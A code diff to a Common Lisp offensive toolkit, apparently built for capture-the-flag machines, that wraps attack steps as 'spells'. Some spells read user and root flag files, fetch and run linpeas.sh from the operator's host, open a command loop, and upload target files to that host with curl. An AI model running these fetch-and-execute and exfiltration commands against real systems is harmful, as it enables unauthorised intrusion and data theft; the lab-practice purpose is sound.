@@ -7,15 +7,18 @@
 
 (defmacro define-spell (name glyphs args &body body)
   "create a spell called `name` that needs `glyphs` and takes `args`"
-  `(progn 
-     (defun ,name ,args
-       ,@(loop for c in glyphs
-               collect `(glyph/available? ,c))
-       ,@body)
-     (setf (gethash (string-upcase ',name) *spells*)
-           (make-spell :name ',name
-                       :needs ',glyphs
-                       :function #',name))))
+  (multiple-value-bind (docstring decls forms) (parse-body body)
+    `(progn 
+       (defun ,name ,args
+         ,@(if docstring (list docstring) '())
+         ,@decls
+         ,@(loop for c in glyphs
+                 collect `(glyph/available? ,c))
+         ,@forms)
+       (setf (gethash (string-upcase ',name) *spells*)
+             (make-spell :name ',name
+                         :needs ',glyphs
+                         :function #',name)))))
 
 (defun spell/runnable? (spell)
   (loop for glyph in (spell-needs spell)
@@ -24,13 +27,18 @@
 (defun spell/list ()
   (a:hash-table-keys *spells*))
 
+(defun spell/description (spell-name)
+  (documentation
+   (intern (str:upcase spell-name))
+   'function))
+
 (defun spell/info (&key show-all)
-  (loop for spell being the hash-value in *spells*
+  (loop for spell being the hash-value in *spells* using (hash-key spell-name)
         for runnable = (spell/runnable? spell)
         for icon = (if runnable "+" " ")
         if (or runnable show-all)
-        do (progn (out "[~a] Spell \"~a\"~%" 
-                       icon (spell-name spell))
+        do (progn (out "[~a] Spell \"~a\"~%" icon spell-name)
+                  (out "    Description: ~S~%" (spell/description spell-name))
                   (out "    Castable? ~a (needs ~{:~a~^, ~})~%~%" 
                        (yes? runnable)
                        (spell-needs spell)))))
@@ -56,14 +64,14 @@
 (define-spell flag (:sight) (&key username root)
   "try to read the flag from user home folders"
   (flet ((try-for-flag (u)
-           (format t "[+] Trying to rea d ~a's flag...~%" u)
+           (format t "[+] Trying to read ~a's flag...~%" u)
            (ignore-errors
              (str:trim
               (use :sight (format nil "/home/~a/~a.txt"
                                   u (if root "root" "user")))))))
     (if username
         (try-for-flag username)
-        (s:~>> (all-users)
+        (s:~>> (users)
                (mapcar #'try-for-flag)
                (remove-if #'null)
                (remove-if #'a:emptyp)))))
@@ -98,10 +106,15 @@
         if (string= command "exit") do (return)
         else do (out "~a~%" (exec-keep-pwd command))))
 
+(define-spell download-linpeas (:command) ()
+  "download linpeas to /tmp in the machine"
+  (use :command (fmt "curl http://~a:5000/tools/linpeas.sh -o /tmp/linpeas.sh"
+                     *host-ip*)))
+
 (define-spell linpeas (:command) ()
+  "download linpeas, execute it and show the result"
   (out "[+] Downloading linpeas~%")
-  (use :command (fmt "curl http://~a:5000/tools/linpeas.sh > /tmp/linpeas.sh"
-                     *host-ip*))
+  (download-linpeas)
 
   (out "[+] Running linpeas.sh~%")
   (use :command "sh /tmp/linpeas.sh > /tmp/output.txt")
@@ -121,10 +134,12 @@
                 files)
         files)))
 
-(define-spell download (:command) (path)
+(define-spell download (:command) (path &key no-server)
   "downloads the file to your project's folder"
-  (use :command (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
-                     path *host-ip*)))
+  (if no-server 
+      (use :command (fmt "base64"))
+      (use :command (fmt "curl -F file=@~a http://~a:5000/upload/"
+                         path *host-ip*))))
 
 (define-spell download-all (:command) (path)
   "downloads all files in the path to your project's folder"
@@ -141,6 +156,7 @@
         res)))
 
 (define-spell path (:command) ()
+  "get the environment variable PATH"
   (str:split ":" (environment "PATH")))
 
 (define-spell system-binaries (:command) (&key absolute-path)
